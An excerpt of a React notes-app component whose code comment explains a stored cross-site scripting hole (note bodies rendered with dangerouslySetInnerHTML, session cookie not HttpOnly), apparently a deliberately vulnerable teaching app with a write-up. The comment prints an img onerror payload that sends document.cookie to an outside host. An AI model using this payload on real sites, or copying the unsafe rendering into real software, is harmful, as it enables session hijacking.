...
// The note body is written to the page with dangerouslySetInnerHTML, so any
// markup a note contains is parsed and executed. Because the session cookie is
// not HttpOnly, a payload like
//   <img src=x onerror="fetch('https://example.com/?c='+document.cookie)">
// stored in one user's note runs in the browser of anyone who views it.
// See docs/writeup/stored-xss.md.
  ...
  return (
    <div>
      ...
      <NoteList
        ...
        onSelect={(id) => {
          setCreating(false);
          void api.getNote(id).then(({ note }) => setSelected(note));
        }}
        onDelete={async (id) => {
